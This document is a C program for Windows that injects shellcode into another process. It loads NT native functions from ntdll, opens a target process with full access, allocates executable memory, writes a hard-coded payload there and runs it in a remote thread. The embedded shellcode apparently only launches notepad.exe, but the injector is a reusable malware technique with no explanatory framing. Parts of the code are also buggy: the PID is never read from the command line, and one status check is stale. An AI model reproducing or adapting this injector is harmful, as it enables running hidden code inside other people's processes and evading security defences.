#include<important.h>
#include<Windows.h>

    /* STRUCTURE DEFINATION HERE */

    //0x10 bytes (sizeof)
    struct _UNICODE_STRING
    {
        USHORT Length;                                                          //0x0
        USHORT MaximumLength;                                                   //0x2
        WCHAR* Buffer;                                                          //0x8
    };

    //0x30 bytes (sizeof)
    typedef struct _OBJECT_ATTRIBUTES
    {
        ULONG Length;                                                           //0x0
        VOID* RootDirectory;                                                    //0x8
        struct _UNICODE_STRING* ObjectName;                                     //0x10
        ULONG Attributes;                                                       //0x18
        VOID* SecurityDescriptor;                                               //0x20
        VOID* SecurityQualityOfService;                                         //0x28
    }*POBJECT_ATTRIBUTES, OBJECT_ATTRIBUTES;

    //0x10 bytes (sizeof)
    typedef struct _CLIENT_ID
    {
        VOID* UniqueProcess;      //  pid                                           //0x0
        VOID* UniqueThread;             //tid                                       //0x8
    }*PCLIENT_ID, CLIENT_ID;


    typedef struct _PS_ATTRIBUTE
    {
        ULONG_PTR Attribute;
        SIZE_T Size;
        union
        {
            ULONG_PTR Value;
            PVOID ValuePtr;
        };
        PSIZE_T ReturnLength;
    } PS_ATTRIBUTE, * PPS_ATTRIBUTE;



    typedef struct _PS_ATTRIBUTE_LIST
    {
        SIZE_T TotalLength;
        PS_ATTRIBUTE Attributes[1];
    } PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;




    /* FUNCTION DEFINATION */


    // OpenProcess
    typedef NTSTATUS(NTAPI* NtOpenProcess)(
        _Out_ PHANDLE ProcessHandle,
        _In_ ACCESS_MASK DesiredAccess,
        _In_ POBJECT_ATTRIBUTES ObjectAttributes,
        _In_opt_ PCLIENT_ID ClientId
        );

    // createThreadEx
    typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
        _Out_ PHANDLE ThreadHandle,
        _In_ ACCESS_MASK DesiredAccess,
        _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
        _In_ HANDLE ProcessHandle,
        _In_ PVOID StartRoutine,
        _In_opt_ PVOID Argument,
        _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
        _In_ SIZE_T ZeroBits,
        _In_ SIZE_T StackSize,
        _In_ SIZE_T MaximumStackSize,
        _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
        );
    

    // createProcess
    typedef NTSTATUS(NTAPI* NtCreateProcess)(
            _Out_ PHANDLE ProcessHandle,
            _In_ ACCESS_MASK DesiredAccess,
            _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
            _In_ HANDLE ParentProcess,
            _In_ BOOLEAN InheritObjectTable,
            _In_opt_ HANDLE SectionHandle,
            _In_opt_ HANDLE DebugPort,
            _In_opt_ HANDLE TokenHandle
        );


    // ProcessClose
    typedef NTSTATUS(NTAPI* NtClose)
        (
            _In_ _Post_ptr_invalid_ HANDLE Handle
        );


    typedef NTSTATUS (NTAPI * NtAllocateVirtualMemory)(
            _In_ HANDLE ProcessHandle,
            _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
            _In_ ULONG_PTR ZeroBits,
            _Inout_ PSIZE_T RegionSize,
            _In_ ULONG AllocationType,
            _In_ ULONG PageProtection
        );
    
    typedef NTSTATUS (NTAPI*NtWriteVirtualMemory)(
            _In_ HANDLE ProcessHandle,
            _In_opt_ PVOID BaseAddress,
            _In_reads_bytes_(NumberOfBytesToWrite) PVOID Buffer,
            _In_ SIZE_T NumberOfBytesToWrite,
            _Out_opt_ PSIZE_T NumberOfBytesWritten
        );
    typedef NTSTATUS (NTAPI* NtWaitForSingleObject)(
            _In_ HANDLE Handle,
            _In_ BOOLEAN Alertable,
            _In_opt_ PLARGE_INTEGER Timeout
        );


    HMODULE GetMod(IN LPCWSTR modName ); 
    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\dell\\Desktop\\codeinJava\\javascript&typescript\\dll_injection\\inject.dll";
    size_t dllPathSize = sizeof(dllPath);

    // get Module handler 

    HMODULE GetMod(
        IN LPCWSTR modName)
    {
        HMODULE hModule = NULL;
        info("trying to get a handle to %S", modName);

        hModule = GetModuleHandleW(modName);

        if (hModule == NULL) {
            warn("failed to get a handle to the module, error : 0x%x\n", GetLastError());
            return NULL;
        }
        else {
            okay("got the handle to the module!");
            info("___%S\n \t 0x%p\n", modName, hModule);
            return hModule;
        }
    }







    int main(int argc, char** argv) {

        DWORD PID=NULL, TID = NULL;
        HANDLE hProcess=NULL, hThread = NULL;
        NTSTATUS status = NULL;
        HMODULE hNTDLL = NULL;
        PVOID rbuffer = NULL;
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        if (argc < 2) {
            warn("pass the pid of the process too!");
            return EXIT_FAILURE;
        }
        const unsigned char shellcode[] =
            "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
            "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
            "\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
            "\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
            "\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
            "\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
            "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
            "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
            "\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
            "\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
            "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
            "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
            "\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

        PVOID BUFFER = (PVOID)shellcode;
        SIZE_T size_shlcd = sizeof(shellcode);

        HANDLE hParent = GetCurrentProcess();
        hNTDLL = GetMod(L"NTDLL");
        NtCreateProcess createProcess = (NtCreateProcess)GetProcAddress(hNTDLL, "NtCreateProcess");
        NtOpenProcess openProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
        NtCreateThreadEx Thread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
        NtAllocateVirtualMemory malloc = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
        NtWriteVirtualMemory writeMem = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
        NtWaitForSingleObject executeThread = (NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
        NtClose close = (NtClose)GetProcAddress(hNTDLL, "NtClose");

        okay("finished , creating process!\n");
        //PID = atoi(argv[1]);
        OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
        CLIENT_ID CID = { (HANDLE)PID,NULL };
        //status = createProcess(&hProcess, PROCESS_ALL_ACCESS,&OA,hParent,FALSE,NULL,NULL,NULL); // this worked too!
        // open a process or create a process
        status = openProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
        
        if (status) {
            warn("process opened/created succesfully!\n, error code : %ld\n",status);
            goto cleanup;
        }
        else {
            //okay("process opened (%d) \n",PID);
            info("process handle here 0x%p\n", hProcess);
        // allocate memory to process
            info("asking to allcote virtual memory of %d", size_shlcd);
            status = malloc(hProcess, &rbuffer, 0,&size_shlcd, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if(status) {
                warn("Failed to allocate memory of %d\n, error code: %ld\n", size_shlcd, status);
                goto cleanup;
            }
            else {
        // write the shellcode to the memory 
                SIZE_T size = NULL;
                info("the address to buffer: 0x%p ", rbuffer);
                //status = writeMem(hProcess, rbuffer, BUFFER,size_shlcd,&size);
                WriteProcessMemory(hProcess, rbuffer, shellcode, size_shlcd, NULL);
                if (status) {
                    warn("Failed to write into memory of size: %d\n, error code: %ld\n", size_shlcd, status);
                    goto cleanup;
                }
                else {
                    info("succesfully written into the memory at 0x%p of size %d\n", rbuffer, size);
        // allocate a thread to the memory 
                    status = Thread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)rbuffer, NULL, FALSE, 0, 0, 0, NULL);
                    if (status) {
                        warn("Failed to create a Remote Thread, error code: %ld\n", status);
                        goto cleanup;
                    }
                    else {
        // execute the thread
                        info("waiting for the thread to execute");
                        status = executeThread(hThread,FALSE, NULL);
                        if (status) {
                            warn("Failed to execute the thread, error code: %ld\n", status);
                            goto cleanup;
                        }
                        else {
                            okay("execute the thread successfully , now exiting this goodbye\n");
        // close the thread and handle of the process
                            goto success;
          
                        }

                    }


                }
            }
        }


    cleanup:
        // exit quitly!
        if (hThread) {
            close(hThread);
        }
        if (hProcess) {
            close(hProcess);
        }
        return EXIT_FAILURE;

    success:
        // exit quitly!
        if (hThread) {
            close(hThread);
        }
        if (hProcess) {
            close(hProcess);
        }
        return EXIT_SUCCESS;

    }